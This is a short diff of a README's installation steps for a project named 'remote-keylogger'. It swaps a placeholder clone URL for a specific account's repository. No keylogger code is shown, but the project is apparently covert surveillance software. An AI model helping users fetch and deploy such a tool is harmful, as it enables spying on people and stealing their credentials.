@@ -20,7 +20,7 @@ Before running the scripts, ensure the following:
 ## Installation
 1. Clone this repository:
    ```bash
-   git clone https://github.com/your-username/remote-keylogger.git
+   git clone https://github.com/mghtyspm/remote-keylogger.git
    cd remote-keylogger
    ```
 2. Install dependencies:
